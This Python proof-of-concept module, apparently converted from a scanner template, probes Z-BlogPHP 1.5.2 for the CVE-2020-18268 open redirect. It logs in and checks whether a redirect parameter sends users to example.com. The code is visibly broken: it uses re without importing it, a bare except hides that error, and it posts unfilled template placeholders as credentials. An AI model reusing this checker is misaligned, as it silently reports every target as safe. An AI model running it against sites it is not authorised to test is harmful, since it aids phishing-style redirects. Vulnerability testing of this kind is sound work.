import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Z-BlogPHP 1.5.2 Open redirect''',
        "description": '''Open Redirect in Z-BlogPHP v1.5.2 and earlier allows remote attackers to obtain sensitive information via the "redirect" parameter in the component "zb_system/cmd.php."''',
        "severity": "medium",
        "references": [
            "https://github.com/zblogcn/zblogphp/issues/216", 
            "https://www.cvedetails.com/cve/CVE-2020-18268"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "cvss-score": "",
            "cve-id": "CVE-2020-18268",
            "cwe-id": "CWE-601"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2020", "redirect", "zblogphp", "authenticated"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        s = requests.Session()

        path = """/zb_system/cmd.php?act=verify"""
        method = "POST"
        data = """btnPost=Log+In&username={{username}}&password={{md5("{{password}}")}}&savedate=0"""
        headers = {'Content-Length': '81', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'close'}
        resp0 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/zb_system/cmd.php?atc=login&redirect=http://www.example.com"""
        method = "GET"
        data = """"""
        headers = {}
        resp1 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""(?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]*)example\.com\/?(\/|[^.].*)?$""",str(resp1.headers))):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url